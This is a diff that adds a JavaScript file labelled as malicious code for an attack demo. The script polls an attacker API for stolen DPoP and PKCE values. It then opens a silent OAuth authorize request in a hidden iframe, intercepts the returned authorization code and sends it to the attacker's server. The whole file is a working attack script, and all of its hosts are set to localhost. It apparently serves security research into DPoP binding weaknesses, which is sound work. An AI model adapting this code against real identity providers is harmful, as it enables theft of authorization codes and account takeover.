@@ -1,0 +1,163 @@
+// Malicious JavaScript for Attack Demo
+(function() {
+    const ATTACKER_API = 'https://localhost:7666';
+    const POLL_INTERVAL = 2000;
+    let attackerSessionId = null;
+    let stolenDpopJkt = null;
+    
+    function log(message) {
+        console.log('[MALICIOUS JS]', message);
+        const indicator = document.getElementById('attack-indicator');
+        const status = document.getElementById('attack-status');
+        if (indicator && status) {
+            indicator.style.display = 'block';
+            status.textContent = message;
+        }
+    }
+    
+    // Poll for stolen dpop_jkt
+    let stolenCodeChallenge = null;
+    let stolenNonce = null;
+    
+    async function pollForDpopJkt() {
+        try {
+            const response = await fetch(`${ATTACKER_API}/api/attack/dpop/latest`);
+            if (response.ok) {
+                const data = await response.json();
+                console.log('[VICTIM] Received DPoP data:', data);
+                log(`Found dpop_jkt from attacker! Session: ${data.sessionId}`);
+                attackerSessionId = data.sessionId;
+                // Try both camelCase and PascalCase property names
+                stolenDpopJkt = data.dpopProof || data.dPoPProof || data.DPoPProof;
+                stolenCodeChallenge = data.codeChallenge || data.CodeChallenge;
+                stolenNonce = data.nonce || data.Nonce;
+                
+                if (!stolenDpopJkt) {
+                    console.error('[VICTIM] Could not find dpop_jkt in response:', data);
+                    log('ERROR: dpop_jkt not found in API response!');
+                    return;
+                }
+                
+                if (!stolenCodeChallenge) {
+                    console.error('[VICTIM] Could not find code_challenge in response:', data);
+                    log('ERROR: code_challenge not found in API response!');
+                    return;
+                }
+                
+                if (!stolenNonce) {
+                    console.error('[VICTIM] Could not find nonce in response:', data);
+                    log('ERROR: nonce not found in API response!');
+                    return;
+                }
+                
+                log(`Stolen dpop_jkt: ${stolenDpopJkt}`);
+                log(`Stolen code_challenge: ${stolenCodeChallenge.substring(0, 20)}...`);
+                log(`Stolen nonce: ${stolenNonce.substring(0, 20)}...`);
+                
+                // Stop polling and start the silent OAuth flow
+                clearInterval(pollInterval);
+                startSilentOAuthFlow();
+            }
+        } catch (error) {
+            // Continue polling
+        }
+    }
+    
+    // Start silent OAuth flow in hidden iframe
+    async function startSilentOAuthFlow() {
+        log('Starting silent OAuth flow with stolen dpop_jkt and code_challenge...');
+        
+        // Use the attacker's code_challenge (they have the matching code_verifier)
+        // No need to generate our own!
+        
+        // Build authorize URL with stolen dpop_jkt and code_challenge, and response_mode=fragment
+        const authorizeUrl = new URL('https://localhost:5001/connect/authorize');
+        authorizeUrl.searchParams.set('client_id', 'dpop'); // Use same client as attacker
+        authorizeUrl.searchParams.set('redirect_uri', 'https://localhost:5010/signin-oidc');
+        authorizeUrl.searchParams.set('response_type', 'code');
+        authorizeUrl.searchParams.set('scope', 'openid profile scope1 offline_access');
+        authorizeUrl.searchParams.set('response_mode', 'fragment'); // Break the flow!
+        authorizeUrl.searchParams.set('dpop_jkt', stolenDpopJkt);
+        authorizeUrl.searchParams.set('state', 'malicious_state_' + Math.random().toString(36).substring(7));
+        authorizeUrl.searchParams.set('code_challenge', stolenCodeChallenge);
+        authorizeUrl.searchParams.set('code_challenge_method', 'S256');
+        authorizeUrl.searchParams.set('nonce', stolenNonce);
+        
+        // Create hidden iframe
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.id = 'attack-iframe';
+        
+        // Monitor iframe for redirect with authorization code
+        iframe.onload = function() {
+            try {
+                const iframeUrl = iframe.contentWindow.location.href;
+                log('Iframe loaded: ' + iframeUrl);
+                
+                // Check if we got redirected to signin-oidc with code in fragment
+                if (iframeUrl.includes('/signin-oidc') && iframeUrl.includes('#')) {
+                    const fragment = iframeUrl.split('#')[1];
+                    const params = new URLSearchParams(fragment);
+                    const code = params.get('code');
+                    const state = params.get('state');
+                    
+                    if (code) {
+                        log('✅ Intercepted authorization code: ' + code.substring(0, 20) + '...');
+                        
+                        // Stop the iframe from processing further
+                        iframe.contentWindow.stop();
+                        
+                        // Exfiltrate the code
+                        exfiltrateCode(code, state);
+                        
+                        // Clean up
+                        document.body.removeChild(iframe);
+                    }
+                }
+            } catch (e) {
+                // Cross-origin error - expected when on different domain
+                log('Cross-origin access blocked (expected)');
+            }
+        };
+        
+        iframe.src = authorizeUrl.toString();
+        document.body.appendChild(iframe);
+        
+        log('Hidden iframe created with authorize URL');
+    }
+    
+    // Send stolen code to attacker API
+    async function exfiltrateCode(code, state) {
+        try {
+            // We don't need to send the code_verifier because the attacker already has it!
+            // They generated the code_challenge, so they have the matching code_verifier
+            
+            const response = await fetch(`${ATTACKER_API}/api/attack/code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: attackerSessionId,
+                    code: code,
+                    state: state,
+                    codeVerifier: null, // Attacker already has this
+                    issuerUrl: 'https://localhost:5001'
+                })
+            });
+            
+            if (response.ok) {
+                log('✅ Successfully sent authorization code to attacker!');
+            } else {
+                log('❌ Failed to send code to attacker');
+            }
+        } catch (error) {
+            log('❌ Error sending code: ' + error.message);
+        }
+    }
+    
+    // Start polling when page loads
+    log('Malicious script loaded. Polling for dpop_jkt...');
+    const pollInterval = setInterval(pollForDpopJkt, POLL_INTERVAL);
+    
+    // Also check immediately
+    pollForDpopJkt();
+})();
